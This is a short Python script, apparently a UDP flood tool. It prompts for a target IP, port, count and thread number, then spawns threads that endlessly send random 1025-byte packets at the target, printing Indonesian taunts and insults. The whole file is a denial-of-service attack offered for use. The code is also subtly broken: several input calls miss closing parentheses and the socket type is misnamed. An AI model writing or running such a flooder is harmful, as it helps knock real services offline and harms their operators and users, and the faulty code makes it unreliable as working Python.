import random
import socket
import threading

print("Orang Biasa")

ip = str(input("Ip :")
port = int(input("Port :")
t1m3 = int(input("Times :")
threads = int(input("Threads :")

def abc():
    data = random._urandom(1025)
    while True:
        try:
         s = socket.socket(socket.AF_INET,socket.DGRAM)
         addr = (str(ip),int(port))
         for x in range(t1m3):
            s.sendto(data,addr)
            print("Orbis nih dek")
        except:
            print("Mampus lu goblok")

for y in range(threads):
     th = threading.Thread(target = abc)
     th.start()
